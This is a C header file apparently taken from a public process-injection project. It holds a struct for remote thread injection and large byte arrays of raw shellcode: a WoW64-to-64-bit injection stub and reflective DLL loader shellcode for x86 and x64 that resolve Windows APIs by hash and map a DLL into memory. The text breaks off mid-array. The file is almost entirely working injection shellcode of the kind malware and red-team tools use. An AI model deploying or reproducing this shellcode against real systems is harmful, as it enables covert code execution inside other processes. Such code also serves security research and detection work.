//Original: https://github.com/UserExistsError/InjectDll
#pragma once

#include "main.h"
#define WIN32_LEAN_AND_MEAN
#include <windows.h>

#pragma pack(push, 1)
struct InjectArgs {
	UINT64 start; // remote shellcode address
	UINT64 hProcess; // handle of process to inject
	UINT64 hThread; // new thread id
};
#pragma pack(pop)

#include <stdio.h>
#include <stdlib.h>
#include <shellapi.h>

#ifdef _WIN64
#define WIN64
#endif

#include "getprocaddress.h"

#if defined(_M_IX86)

const unsigned char injectWow64toNative64[] = {
	0x48, 0x89, 0x5c, 0x24, 0x08, 0x48, 0x89, 0x6c, 0x24, 0x10, 0x48, 0x89, 0x74, 0x24, 0x18, 0x57,
	0x48, 0x83, 0xec, 0x50, 0x65, 0x48, 0x8b, 0x04, 0x25, 0x60, 0x00, 0x00, 0x00, 0x48, 0x8b, 0xf9,
	0x48, 0x8b, 0x50, 0x18, 0x48, 0x8b, 0x5a, 0x20, 0x48, 0x85, 0xdb, 0x0f, 0x84, 0xc4, 0x00, 0x00,
	0x00, 0x33, 0xf6, 0xbd, 0xff, 0xff, 0x00, 0x00, 0x0f, 0x1f, 0x84, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x4c, 0x8b, 0x43, 0x50, 0x48, 0x8b, 0xd6, 0x44, 0x0f, 0xb7, 0x4b, 0x48, 0x0f, 0x1f, 0x40, 0x00,
	0x41, 0x0f, 0xb6, 0x08, 0x4d, 0x8d, 0x40, 0x01, 0xc1, 0xca, 0x0d, 0x8b, 0xc2, 0x48, 0x03, 0xc1,
	0x80, 0xf9, 0x61, 0x48, 0x8d, 0x50, 0xe0, 0x48, 0x0f, 0x42, 0xd0, 0x66, 0x44, 0x03, 0xcd, 0x75,
	0xdf, 0x81, 0xfa, 0x5d, 0x68, 0xfa, 0x3c, 0x75, 0x70, 0x4c, 0x8b, 0x53, 0x20, 0x49, 0x63, 0x42,
	0x3c, 0x46, 0x8b, 0x9c, 0x10, 0x88, 0x00, 0x00, 0x00, 0x47, 0x8b, 0x44, 0x13, 0x20, 0x47, 0x8b,
	0x4c, 0x13, 0x24, 0x4d, 0x03, 0xc2, 0x4d, 0x03, 0xca, 0x0f, 0x1f, 0x80, 0x00, 0x00, 0x00, 0x00,
	0x41, 0x8b, 0x10, 0x8b, 0xc6, 0x49, 0x03, 0xd2, 0x0f, 0xb6, 0x0a, 0x0f, 0x1f, 0x44, 0x00, 0x00,
	0xc1, 0xc8, 0x0d, 0x48, 0x8d, 0x52, 0x01, 0x0f, 0xbe, 0xc9, 0x03, 0xc1, 0x0f, 0xb6, 0x0a, 0x84,
	0xc9, 0x75, 0xed, 0x3d, 0x41, 0x20, 0x2f, 0x44, 0x74, 0x0a, 0x49, 0x83, 0xc0, 0x04, 0x49, 0x83,
	0xc1, 0x02, 0xeb, 0xcc, 0x43, 0x8b, 0x4c, 0x13, 0x1c, 0x41, 0x0f, 0xb7, 0x11, 0x49, 0x03, 0xca,
	0x44, 0x8b, 0x1c, 0x91, 0x4d, 0x03, 0xda, 0x75, 0x23, 0x48, 0x8b, 0x1b, 0x48, 0x85, 0xdb, 0x0f,
	0x85, 0x4b, 0xff, 0xff, 0xff, 0x33, 0xc0, 0x48, 0x8b, 0x5c, 0x24, 0x60, 0x48, 0x8b, 0x6c, 0x24,
	0x68, 0x48, 0x8b, 0x74, 0x24, 0x70, 0x48, 0x83, 0xc4, 0x50, 0x5f, 0xc3, 0x48, 0x8b, 0x4f, 0x08,
	0x48, 0x8d, 0x47, 0x10, 0x48, 0x89, 0x74, 0x24, 0x48, 0x45, 0x33, 0xc9, 0x48, 0x89, 0x44, 0x24,
	0x40, 0x45, 0x33, 0xc0, 0x48, 0x8b, 0x07, 0x33, 0xd2, 0x48, 0x89, 0x74, 0x24, 0x38, 0x48, 0x89,
	0x44, 0x24, 0x30, 0x48, 0x89, 0x74, 0x24, 0x28, 0x48, 0x89, 0x74, 0x24, 0x20, 0x41, 0xff, 0xd3,
	0xeb, 0xb5,
};

#endif

// Loader shellcode from https ://github.com/UserExistsError/DllLoaderShellcode

const unsigned char loader_x86[] = {
	0x55, 0x8b, 0xec, 0x83, 0xec, 0x24, 0x53, 0x33, 0xdb, 0xc7, 0x45, 0xe8, 0x00, 0x00, 0x00, 0x00,
	0x57, 0xc7, 0x45, 0xe4, 0x00, 0x00, 0x00, 0x00, 0x89, 0x5d, 0xf4, 0x89, 0x5d, 0xe0, 0x89, 0x5d,
	0xec, 0xe8, 0x4a, 0x04, 0x00, 0x00, 0x8b, 0xf8, 0xba, 0x4d, 0x5a, 0x00, 0x00, 0x0f, 0x1f, 0x00,
	0x66, 0x39, 0x17, 0x75, 0x16, 0x8b, 0x4f, 0x3c, 0x8d, 0x41, 0xc0, 0x3d, 0xbf, 0x03, 0x00, 0x00,
	0x77, 0x09, 0x81, 0x3c, 0x39, 0x50, 0x45, 0x00, 0x00, 0x74, 0x03, 0x47, 0xeb, 0xe2, 0xb8, 0x4c,
	0x01, 0x00, 0x00, 0x89, 0x7d, 0xf8, 0x66, 0x39, 0x44, 0x39, 0x04, 0x74, 0x08, 0x5f, 0x33, 0xc0,
	0x5b, 0x8b, 0xe5, 0x5d, 0xc3, 0x64, 0xa1, 0x30, 0x00, 0x00, 0x00, 0x56, 0x8b, 0x40, 0x0c, 0x8b,
	0x40, 0x14, 0x89, 0x45, 0xfc, 0x85, 0xc0, 0x0f, 0x84, 0xbd, 0x01, 0x00, 0x00, 0x0f, 0x1f, 0x00,
	0x8b, 0x70, 0x28, 0x33, 0xc9, 0x0f, 0xb7, 0x50, 0x24, 0x0f, 0x1f, 0x80, 0x00, 0x00, 0x00, 0x00,
	0x0f, 0xb6, 0x3e, 0xc1, 0xc9, 0x0d, 0x80, 0x3e, 0x61, 0x72, 0x03, 0x83, 0xc1, 0xe0, 0x81, 0xc2,
	0xff, 0xff, 0x00, 0x00, 0x03, 0xcf, 0x46, 0x66, 0x85, 0xd2, 0x75, 0xe4, 0x81, 0xf9, 0x5b, 0xbc,
	0x4a, 0x6a, 0x0f, 0x85, 0xcf, 0x00, 0x00, 0x00, 0x8b, 0x5d, 0xfc, 0xbf, 0x04, 0x00, 0x00, 0x00,
	0x8b, 0x73, 0x10, 0x8b, 0x46, 0x3c, 0x8b, 0x44, 0x30, 0x78, 0x03, 0xc6, 0x89, 0x45, 0xdc, 0x8b,
	0x58, 0x20, 0x8b, 0x40, 0x24, 0x03, 0xde, 0x03, 0xc6, 0x89, 0x45, 0xf0, 0x0f, 0x1f, 0x40, 0x00,
	0x8b, 0x13, 0x03, 0xd6, 0x33, 0xc0, 0x8a, 0x0a, 0x0f, 0x1f, 0x84, 0x00, 0x00, 0x00, 0x00, 0x00,
	0xc1, 0xc8, 0x0d, 0x8d, 0x52, 0x01, 0x0f, 0xbe, 0xc9, 0x03, 0xc1, 0x8a, 0x0a, 0x84, 0xc9, 0x75,
	0xef, 0x3d, 0x8e, 0x4e, 0x0e, 0xec, 0x74, 0x15, 0x3d, 0xaa, 0xfc, 0x0d, 0x7c, 0x74, 0x0e, 0x3d,
	0x54, 0xca, 0xaf, 0x91, 0x74, 0x07, 0x3d, 0xf2, 0x32, 0xf6, 0x0e, 0x75, 0x55, 0x8b, 0x4d, 0xf0,
	0x0f, 0xb7, 0x11, 0x8b, 0x4d, 0xdc, 0x8b, 0x49, 0x1c, 0x8d, 0x0c, 0x91, 0x03, 0xce, 0x3d, 0x8e,
	0x4e, 0x0e, 0xec, 0x75, 0x09, 0x8b, 0x01, 0x03, 0xc6, 0x89, 0x45, 0xe8, 0xeb, 0x2e, 0x3d, 0xaa,
	0xfc, 0x0d, 0x7c, 0x75, 0x09, 0x8b, 0x01, 0x03, 0xc6, 0x89, 0x45, 0xe4, 0xeb, 0x1e, 0x3d, 0x54,
	0xca, 0xaf, 0x91, 0x75, 0x09, 0x8b, 0x01, 0x03, 0xc6, 0x89, 0x45, 0xf4, 0xeb, 0x0e, 0x3d, 0xf2,
	0x32, 0xf6, 0x0e, 0x75, 0x07, 0x8b, 0x01, 0x03, 0xc6, 0x89, 0x45, 0xec, 0x81, 0xc7, 0xff, 0xff,
	0x00, 0x00, 0x83, 0x45, 0xf0, 0x02, 0x83, 0xc3, 0x04, 0x66, 0x85, 0xff, 0x0f, 0x85, 0x5e, 0xff,
	0xff, 0xff, 0xe9, 0x81, 0x00, 0x00, 0x00, 0x81, 0xf9, 0x5d, 0x68, 0xfa, 0x3c, 0x75, 0x7c, 0x8b,
	0x5d, 0xfc, 0xc7, 0x45, 0xf0, 0x01, 0x00, 0x00, 0x00, 0x8b, 0x5b, 0x10, 0x8b, 0x43, 0x3c, 0x8b,
	0x44, 0x18, 0x78, 0x03, 0xc3, 0x89, 0x45, 0xdc, 0x8b, 0x78, 0x20, 0x8b, 0x70, 0x24, 0x03, 0xfb,
	0x03, 0xf3, 0x8b, 0x07, 0x33, 0xc9, 0x8d, 0x14, 0x18, 0x8a, 0x02, 0x0f, 0x1f, 0x44, 0x00, 0x00,
	0xc1, 0xc9, 0x0d, 0x8d, 0x52, 0x01, 0x0f, 0xbe, 0xc0, 0x03, 0xc8, 0x8a, 0x02, 0x84, 0xc0, 0x75,
	0xef, 0x81, 0xf9, 0xb8, 0x0a, 0x4c, 0x53, 0x75, 0x21, 0x8b, 0x45, 0xdc, 0x0f, 0xb7, 0x0e, 0x8b,
	0x40, 0x1c, 0x8d, 0x04, 0x88, 0x8b, 0x04, 0x18, 0x03, 0xc3, 0x89, 0x45, 0xe0, 0x8b, 0x45, 0xf0,
	0x05, 0xff, 0xff, 0x00, 0x00, 0x89, 0x45, 0xf0, 0xeb, 0x03, 0x8b, 0x45, 0xf0, 0x83, 0xc7, 0x04,
	0x83, 0xc6, 0x02, 0x66, 0x85, 0xc0, 0x75, 0xaa, 0x8b, 0x5d, 0xf4, 0x83, 0x7d, 0xe8, 0x00, 0x74,
	0x16, 0x83, 0x7d, 0xe4, 0x00, 0x74, 0x10, 0x85, 0xdb, 0x74, 0x0c, 0x83, 0x7d, 0xec, 0x00, 0x74,
	0x06, 0x83, 0x7d, 0xe0, 0x00, 0x75, 0x10, 0x8b, 0x45, 0xfc, 0x8b, 0x00, 0x89, 0x45, 0xfc, 0x85,
	0xc0, 0x0f, 0x85, 0x49, 0xfe, 0xff, 0xff, 0x8b, 0x7d, 0xf8, 0x8b, 0x5f, 0x3c, 0x6a, 0x40, 0x03,
	0xdf, 0x68, 0x00, 0x30, 0x00, 0x00, 0x89, 0x5d, 0xf0, 0xff, 0x73, 0x50, 0x6a, 0x00, 0xff, 0x55,
	0xf4, 0xff, 0x73, 0x50, 0x8b, 0xf0, 0x56, 0x89, 0x75, 0xfc, 0xff, 0x55, 0xec, 0x8b, 0x53, 0x54,
	0x8b, 0xcf, 0x85, 0xd2, 0x74, 0x18, 0x8b, 0xfe, 0x2b, 0x7d, 0xf8, 0x0f, 0x1f, 0x44, 0x00, 0x00,
	0x8a, 0x01, 0x8d, 0x49, 0x01, 0x88, 0x44, 0x0f, 0xff, 0x83, 0xea, 0x01, 0x75, 0xf2, 0x0f, 0xb7,
	0x7b, 0x14, 0x03, 0xfb, 0x0f, 0xb7, 0x5b, 0x06, 0x85, 0xdb, 0x74, 0x34, 0x8b, 0x45, 0xf8, 0x83,
	0xc7, 0x2c, 0x8b, 0x4f, 0xf8, 0x4b, 0x8b, 0x17, 0x03, 0xce, 0x8b, 0x77, 0xfc, 0x03, 0xd0, 0x85,
	0xf6, 0x74, 0x13, 0x8a, 0x02, 0x8d, 0x49, 0x01, 0x88, 0x41, 0xff, 0x8d, 0x52, 0x01, 0x83, 0xee,
	0x01, 0x75, 0xf0, 0x8b, 0x45, 0xf8, 0x8b, 0x75, 0xfc, 0x83, 0xc7, 0x28, 0x85, 0xdb, 0x75, 0xd2,
	0x8b, 0x5d, 0xf0, 0x8b, 0xbb, 0x80, 0x00, 0x00, 0x00, 0x03, 0xfe, 0x89, 0x7d, 0xec, 0x83, 0x3f,
	0x00, 0x74, 0x7d, 0x8b, 0x47, 0x0c, 0x03, 0xc6, 0x50, 0xff, 0x55, 0xe8, 0x8b, 0xd8, 0x85, 0xdb,
	0x74, 0x60, 0x8b, 0x37, 0x8b, 0x55, 0xfc, 0x03, 0xf2, 0x8b, 0x7f, 0x10, 0x03, 0xfa, 0x83, 0x3f,
	0x00, 0x74, 0x49, 0x85, 0xf6, 0x74, 0x22, 0x8b, 0x0e, 0x85, 0xc9, 0x79, 0x1c, 0x8b, 0x43, 0x3c,
	0x0f, 0xb7, 0xc9, 0x8b, 0x44, 0x18, 0x78, 0x2b, 0x4c, 0x18, 0x10, 0x8b, 0x44, 0x18, 0x1c, 0x8d,
	0x04, 0x88, 0x8b, 0x04, 0x18, 0x03, 0xc3, 0xeb, 0x0f, 0x8b, 0x07, 0x83, 0xc2, 0x02, 0x03, 0xc2,
	0x50, 0x53, 0xff, 0x55, 0xe4, 0x8b, 0x55, 0xfc, 0x89, 0x07, 0x83, 0xc7, 0x04, 0x85, 0xf6, 0x8d,
	0x46, 0x04, 0x0f, 0x44, 0xc6, 0x83, 0x3f, 0x00, 0x8b, 0xf0, 0x75, 0xb7, 0x8b, 0x75, 0xfc, 0x8b,
	0x7d, 0xec, 0x83, 0xc7, 0x14, 0x89, 0x7d, 0xec, 0x83, 0x3f, 0x00, 0x75, 0x86, 0x8b, 0x5d, 0xf0,
	0x8b, 0x93, 0xa4, 0x00, 0x00, 0x00, 0x8b, 0xfe, 0x2b, 0x7b, 0x34, 0x89, 0x55, 0xec, 0x85, 0xd2,
	0x0f, 0x84, 0xb0, 0x00, 0x00, 0x00, 0x8b, 0x83, 0xa0, 0x00, 0x00, 0x00, 0x03, 0xc6, 0x89, 0x45,
	0xe4, 0x8b, 0x48, 0x04, 0x85, 0xc9, 0x0f, 0x84, 0x97, 0x00, 0x00, 0x00, 0x8b, 0x30, 0x8d, 0x59,
	0xf8, 0x03, 0x75, 0xfc, 0x83, 0xc0, 0x08, 0xd1, 0xeb, 0x89, 0x45, 0xe8, 0x74, 0x70, 0x66, 0x90,
	0x0f, 0xb7, 0x10, 0x4b, 0x66, 0x8b, 0xc2, 0x8b, 0xca, 0x66, 0xc1, 0xe8, 0x0c, 0x66, 0x83, 0xf8,
	0x0a, 0x75, 0x0b, 0x81, 0xe2, 0xff, 0x0f, 0x00, 0x00, 0x01, 0x3c, 0x32, 0xeb, 0x38, 0x66, 0x83,
	0xf8, 0x03, 0x75, 0x0b, 0x81, 0xe1, 0xff, 0x0f, 0x00, 0x00, 0x01, 0x3c, 0x31, 0xeb, 0x27, 0x66,
	0x83, 0xf8, 0x01, 0x75, 0x11, 0x81, 0xe1, 0xff, 0x0f, 0x00, 0x00, 0x8b, 0xc7, 0xc1, 0xe8, 0x10,
	0x66, 0x01, 0x04, 0x31, 0xeb, 0x10, 0x66, 0x83, 0xf8, 0x02, 0x75, 0x0a, 0x81, 0xe1, 0xff, 0x0f,
	0x00, 0x00, 0x66, 0x01, 0x3c, 0x31, 0x8b, 0x45, 0xe8, 0x83, 0xc0, 0x02, 0x89, 0x45, 0xe8, 0x85,
	0xdb, 0x75, 0x9d, 0x8b, 0x45, 0xe4, 0x8b, 0x55, 0xec, 0x8b, 0x48, 0x04, 0xeb, 0x03, 0x8b, 0x45,
	0xe4, 0x2b, 0xd1, 0x03, 0xc1, 0x89, 0x55, 0xec, 0x89, 0x45, 0xe4, 0x85, 0xd2, 0x0f, 0x85, 0x5e,
	0xff, 0xff, 0xff, 0x8b, 0x5d, 0xf0, 0x8b, 0x73, 0x28, 0x8b, 0x5d, 0xfc, 0x03, 0xf3, 0x6a, 0x00,
	0x6a, 0x00, 0x6a, 0xff, 0xff, 0x55, 0xe0, 0x6a, 0x00, 0x6a, 0x01, 0x53, 0xff, 0xd6, 0x8b, 0xc6,
	0x5e, 0x5f, 0x5b, 0x8b, 0xe5, 0x5d, 0xc3, 0xcc, 0xcc, 0xcc, 0xcc, 0xcc, 0xcc, 0xcc, 0xcc, 0xcc,
	0xc1, 0xc9, 0x0d, 0x8b, 0xc1, 0xc3, 0xcc, 0xcc, 0xcc, 0xcc, 0xcc, 0xcc, 0xcc, 0xcc, 0xcc, 0xcc,
	0x8a, 0x11, 0x33, 0xc0, 0xc1, 0xc8, 0x0d, 0x8d, 0x49, 0x01, 0x0f, 0xbe, 0xd2, 0x03, 0xc2, 0x8a,
	0x11, 0x84, 0xd2, 0x75, 0xef, 0xc3, 0xcc, 0xcc, 0xcc, 0xcc, 0xcc, 0xcc, 0xcc, 0xcc, 0xcc, 0xcc,
	0x55, 0x8b, 0xec, 0x8b, 0x45, 0x04, 0x5d, 0xc3
};

const unsigned char loader_x64[] = {
	0x40, 0x55, 0x56, 0x41, 0x54, 0x41, 0x55, 0x41, 0x56, 0x48, 0x83, 0xec, 0x30, 0x45, 0x33, 0xf6,
	0x45, 0x33, 0xc9, 0x45, 0x33, 0xe4, 0x4c, 0x89, 0x74, 0x24, 0x68, 0x33, 0xf6, 0x4c, 0x89, 0x4c,
	0x24, 0x60, 0x33, 0xed, 0xe8, 0x07, 0x05, 0x00, 0x00, 0x4c, 0x8b, 0xe8, 0xb8, 0x4d, 0x5a, 0x00,
	0x00, 0x66, 0x41, 0x39, 0x45, 0x00, 0x75, 0x1b, 0x49, 0x63, 0x55, 0x3c, 0x48, 0x8d, 0x4a, 0xc0,
	0x48, 0x81, 0xf9, 0xbf, 0x03, 0x00, 0x00, 0x77, 0x0a, 0x42, 0x81, 0x3c, 0x2a, 0x50, 0x45, 0x00,
	0x00, 0x74, 0x05, 0x49, 0xff, 0xc5, 0xeb, 0xd9, 0xb8, 0x64, 0x86, 0x00, 0x00, 0x4c, 0x89, 0x6c,
	0x24, 0x70, 0x66, 0x42, 0x39, 0x44, 0x2a, 0x04, 0x74, 0x0f, 0x33, 0xc0, 0x48, 0x83, 0xc4, 0x30,
	0x41, 0x5e, 0x41, 0x5d, 0x41, 0x5c, 0x5e, 0x5d, 0xc3, 0x65, 0x48, 0x8b, 0x04, 0x25, 0x60, 0x00,
	0x00, 0x00, 0x41, 0xbb, 0x01, 0x00, 0x00, 0x00, 0x48, 0x89, 0x5c, 0x24, 0x78, 0x48, 0x89, 0x7c,
	0x24, 0x28, 0x4c, 0x89, 0x7c, 0x24, 0x20, 0x48, 0x8b, 0x48, 0x18, 0x4c, 0x8b, 0x79, 0x20, 0x4d,
	0x85, 0xff, 0x0f, 0x84, 0xf0, 0x01, 0x00, 0x00, 0x41, 0x8d, 0x5b, 0x03, 0x41, 0xba, 0xff, 0xff,
	0x00, 0x00, 0x49, 0x8b, 0x57, 0x50, 0x33, 0xc0, 0x45, 0x0f, 0xb7, 0x47, 0x48, 0x0f, 0x1f, 0x00,
	0x0f, 0xb6, 0x0a, 0xc1, 0xc8, 0x0d, 0x80, 0xf9, 0x61, 0x72, 0x04, 0x48, 0x83, 0xc0, 0xe0, 0x48,
	0x03, 0xc1, 0x48, 0xff, 0xc2, 0x66, 0x45, 0x03, 0xc2, 0x75, 0xe5, 0x3d, 0x5b, 0xbc, 0x4a, 0x6a,
	0x0f, 0x85, 0xe5, 0x00, 0x00, 0x00, 0x4d, 0x8b, 0x4f, 0x20, 0x41, 0xbd, 0xff, 0xff, 0x00, 0x00,
	0x49, 0x63, 0x41, 0x3c, 0x42, 0x8b, 0xbc, 0x08, 0x88, 0x00, 0x00, 0x00, 0x46, 0x8b, 0x54, 0x0f,
	0x20, 0x46, 0x8b, 0x5c, 0x0f, 0x24, 0x4d, 0x03, 0xd1, 0x4d, 0x03, 0xd9, 0x0f, 0x1f, 0x40, 0x00,
	0x41, 0x8b, 0x02, 0x45, 0x33, 0xc0, 0x4a, 0x8d, 0x0c, 0x08, 0x42, 0x0f, 0xb6, 0x04, 0x08, 0x90,
	0x41, 0xc1, 0xc8, 0x0d, 0x48, 0x8d, 0x49, 0x01, 0x0f, 0xbe, 0xc0, 0x44, 0x03, 0xc0, 0x0f, 0xb6,
	0x01, 0x84, 0xc0, 0x75, 0xeb, 0x41, 0x81, 0xf8, 0x8e, 0x4e, 0x0e, 0xec, 0x74, 0x1b, 0x41, 0x81,
	0xf8, 0xaa, 0xfc, 0x0d, 0x7c, 0x74, 0x12, 0x41, 0x81, 0xf8, 0x54, 0xca, 0xaf, 0x91, 0x74, 0x09,
	0x41, 0x81, 0xf8, 0xf2, 0x32, 0xf6, 0x0e, 0x75, 0x54, 0x42, 0x8b, 0x4c, 0x0f, 0x1c, 0x41, 0x0f,
	0xb7, 0x13, 0x49, 0x03, 0xc9, 0x41, 0x81, 0xf8, 0x8e, 0x4e, 0x0e, 0xec, 0x75, 0x09, 0x44, 0x8b,
	0x34, 0x91, 0x4d, 0x03, 0xf1, 0xeb, 0x32, 0x41, 0x81, 0xf8, 0xaa, 0xfc, 0x0d, 0x7c, 0x75, 0x09,
	0x44, 0x8b, 0x24, 0x91, 0x4d, 0x03, 0xe1, 0xeb, 0x20, 0x41, 0x81, 0xf8, 0x54, 0xca, 0xaf, 0x91,
	0x75, 0x08, 0x8b, 0x34, 0x91, 0x49, 0x03, 0xf1, 0xeb, 0x0f, 0x41, 0x81, 0xf8, 0xf2, 0x32, 0xf6,
	0x0e, 0x75, 0x06, 0x8b, 0x2c, 0x91, 0x49, 0x03, 0xe9, 0x66, 0x41, 0x03, 0xdd, 0x49, 0x83, 0xc2,
	0x04, 0x49, 0x83, 0xc3, 0x02, 0x66, 0x85, 0xdb, 0x0f, 0x85, 0x52, 0xff, 0xff, 0xff, 0x4c, 0x89,
	0x74, 0x24, 0x68, 0x45, 0x8b, 0xd5, 0xe9, 0x94, 0x00, 0x00, 0x00, 0x3d, 0x5d, 0x68, 0xfa, 0x3c,
	0x0f, 0x85, 0x98, 0x00, 0x00, 0x00, 0x4d, 0x8b, 0x57, 0x20, 0x41, 0xbe, 0xff, 0xff, 0x00, 0x00,
	0x49, 0x63, 0x42, 0x3c, 0x42, 0x8b, 0x9c, 0x10, 0x88, 0x00, 0x00, 0x00, 0x46, 0x8b, 0x44, 0x13,
	0x20, 0x46, 0x8b, 0x4c, 0x13, 0x24, 0x4d, 0x03, 0xc2, 0x4d, 0x03, 0xca, 0x0f, 0x1f, 0x40, 0x00,
	0x41, 0x8b, 0x00, 0x33, 0xc9, 0x4a, 0x8d, 0x14, 0x10, 0x42, 0x0f, 0xb6, 0x04, 0x10, 0x66, 0x90,
	0xc1, 0xc9, 0x0d, 0x48, 0x8d, 0x52, 0x01, 0x0f, 0xbe, 0xc0, 0x03, 0xc8, 0x0f, 0xb6, 0x02, 0x84,
	0xc0, 0x75, 0xed, 0x81, 0xf9, 0xb8, 0x0a, 0x4c, 0x53, 0x75, 0x1b, 0x42, 0x8b, 0x4c, 0x13, 0x1c,
	0x41, 0x0f, 0xb7, 0x11, 0x49, 0x03, 0xca, 0x8b, 0x3c, 0x91, 0x49, 0x03, 0xfa, 0x48, 0x89, 0x7c,
	0x24, 0x60, 0x66, 0x45, 0x03, 0xde, 0x49, 0x83, 0xc0, 0x04, 0x49, 0x83, 0xc1, 0x02, 0x66, 0x45,
	0x85, 0xdb, 0x75, 0xac, 0x4c, 0x8b, 0x74, 0x24, 0x68, 0x41, 0xba, 0xff, 0xff, 0x00, 0x00, 0x4c,
	0x8b, 0x4c, 0x24, 0x60, 0x41, 0xbb, 0x01, 0x00, 0x00, 0x00, 0x41, 0x8d, 0x5b, 0x03, 0x4d, 0x85,
	0xf6, 0x74, 0x14, 0x4d, 0x85, 0xe4, 0x74, 0x0f, 0x48, 0x85, 0xf6, 0x74, 0x0a, 0x48, 0x85, 0xed,
	0x74, 0x05, 0x4d, 0x85, 0xc9, 0x75, 0x0c, 0x4d, 0x8b, 0x3f, 0x4d, 0x85, 0xff, 0x0f, 0x85, 0x1f,
	0xfe, 0xff, 0xff, 0x4c, 0x8b, 0x6c, 0x24, 0x70, 0x4d, 0x63, 0x7d, 0x3c, 0x33, 0xc9, 0x4d, 0x03,
	0xfd, 0x41, 0xb8, 0x00, 0x30, 0x00, 0x00, 0x44, 0x8d, 0x49, 0x40, 0x41, 0x8b, 0x57, 0x50, 0xff,
	0xd6, 0x41, 0x8b, 0x57, 0x50, 0x48, 0x8b, 0xc8, 0x4c, 0x8b, 0xf0, 0xff, 0xd5, 0x41, 0x8b, 0x57,
	0x54, 0x49, 0x8b, 0xcd, 0x48, 0x85, 0xd2, 0x74, 0x17, 0x4d, 0x8b, 0xc6, 0x4d, 0x2b, 0xc5, 0x90,
	0x0f, 0xb6, 0x01, 0x41, 0x88, 0x04, 0x08, 0x48, 0xff, 0xc1, 0x48, 0x83, 0xea, 0x01, 0x75, 0xf0,
	0x45, 0x0f, 0xb7, 0x4f, 0x14, 0x45, 0x0f, 0xb7, 0x57, 0x06, 0x49, 0x83, 0xc1, 0x2c, 0x4d, 0x85,
	0xd2, 0x74, 0x47, 0x4d, 0x03, 0xcf, 0x66, 0x66, 0x0f, 0x1f, 0x84, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x41, 0x8b, 0x49, 0xf8, 0x49, 0xff, 0xca, 0x41, 0x8b, 0x11, 0x49, 0x03, 0xce, 0x45, 0x8b, 0x41,
	0xfc, 0x49, 0x03, 0xd5, 0x4d, 0x85, 0xc0, 0x74, 0x18, 0x0f, 0x1f, 0x80, 0x00, 0x00, 0x00, 0x00,
	0x0f, 0xb6, 0x02, 0x48, 0xff, 0xc2, 0x88, 0x01, 0x48, 0xff, 0xc1, 0x49, 0x83, 0xe8, 0x01, 0x75,
	0xef, 0x49, 0x83, 0xc1, 0x28, 0x4d, 0x85, 0xd2, 0x75, 0xc6, 0x41, 0x8b, 0xaf, 0x90, 0x00, 0x00,
	0x00, 0x49, 0x03, 0xee, 0x83, 0x7d, 0x00, 0x00, 0x0f, 0x84, 0x92, 0x00, 0x00, 0x00, 0x4c, 0x8b,
	0x6c, 0x24, 0x68, 0x8b, 0x4d, 0x0c, 0x49, 0x03, 0xce, 0x41, 0xff, 0xd5, 0x48, 0x8b, 0xf0, 0x48,
	0x85, 0xc0, 0x74, 0x6e, 0x8b, 0x7d, 0x10, 0x8b, 0x5d, 0x00, 0x49, 0x03, 0xfe, 0x49, 0x03, 0xde,
	0x48, 0x83, 0x3f, 0x00, 0x74, 0x5c, 0x48, 0x85, 0xdb, 0x74, 0x2c, 0x48, 0x8b, 0x13, 0x48, 0x85,
	0xd2, 0x79, 0x24, 0x48, 0x63, 0x46, 0x3c, 0x0f, 0xb7, 0xd2, 0x8b, 0x8c, 0x30, 0x88, 0x00, 0x00,
	0x00, 0x8b, 0x44, 0x31, 0x10, 0x8b, 0x4c, 0x31, 0x1c, 0x48, 0x2b, 0xd0, 0x48, 0x03, 0xce, 0x8b,
	0x04, 0x91, 0x48, 0x03, 0xc6, 0xeb, 0x10, 0x48, 0x8b, 0x17, 0x48, 0x8b, 0xce, 0x48, 0x83, 0xc2,
	0x02, 0x49, 0x03, 0xd6, 0x41, 0xff, 0xd4, 0x48, 0x89, 0x07, 0x48, 0x83, 0xc7, 0x08, 0x48, 0x85,
	0xdb, 0x48, 0x8d, 0x43, 0x08, 0x48, 0x0f, 0x44, 0xc3, 0x48, 0x83, 0x3f, 0x00, 0x48, 0x8b, 0xd8,
	0x75, 0xa4, 0x48, 0x83, 0xc5, 0x14, 0x83, 0x7d, 0x00, 0x00, 0x0f, 0x85, 0x73, 0xff, 0xff, 0xff,
	0x41, 0x8b, 0x87, 0xb4, 0x00, 0x00, 0x00, 0x4d, 0x8b, 0xce, 0x4d, 0x2b, 0x4f, 0x30, 0x85, 0xc0,
	0x0f, 0x84, 0xb9, 0x00, 0x00, 0x00, 0x41, 0x8b, 0x9f, 0xb0, 0x00, 0x00, 0x00, 0x8b, 0xf8, 0x49,
	0x03, 0xde, 0x85, 0xc0, 0x0f, 0x84, 0xa5, 0x00, 0x00, 0x00, 0x66, 0x0f, 0x1f, 0x44, 0x00, 0x00,
	0x8b, 0x43, 0x04, 0x85, 0xc0, 0x0f, 0x84, 0x94, 0x00, 0x00, 0x00, 0x44, 0x8b, 0x03, 0x4c, 0x8d,
	0x50, 0xf8, 0x4d, 0x03, 0xc6, 0x4c, 0x8d, 0x5b, 0x08, 0x49, 0xd1, 0xea, 0x74, 0x75, 0x66, 0x90,
	0x41, 0x0f, 0xb7, 0x13, 0x49, 0xff, 0xca, 0x0f, 0xb7, 0xca, 0x0f, 0xb7, 0xc2, 0x66, 0xc1, 0xe9,
	0x0c, 0x66, 0x83, 0xf9, 0x0a, 0x75, 0x14, 0x81, 0xe2, 0xff, 0x0f, 0x00, 0x00, 0x4a, 0x8b, 0x04,
	0x02, 0x49, 0x8d, 0x0c, 0x01, 0x4a, 0x89, 0x0c, 0x02, 0xeb, 0x3c, 0x66, 0x83, 0xf9, 0x03, 0x75,
	0x0b, 0x25, 0xff, 0x0f, 0x00, 0x00, 0x46, 0x01, 0x0c, 0x00, 0xeb, 0x2b, 0x66, 0x83, 0xf9, 0x01,
	0x75, 0x15, 0x25, 0xff, 0x0f, 0x00, 0x00, 0x4a, 0x8d, 0x0c, 0x00, 0x49, 0x8b, 0xc1, 0x48, 0xc1,
	0xe8, 0x10, 0x66, 0x01, 0x01, 0xeb, 0x10, 0x66, 0x83, 0xf9, 0x02, 0x75, 0x0a, 0x25, 0xff, 0x0f,
	0x00, 0x00, 0x66, 0x46, 0x01, 0x0c, 0x00, 0x49, 0x83, 0xc3, 0x02, 0x4d, 0x85, 0xd2, 0x75, 0x90,
	0x8b, 0x43, 0x04, 0x48, 0x03, 0xd8, 0x48, 0x2b, 0xf8, 0x0f, 0x85, 0x61, 0xff, 0xff, 0xff, 0x41,
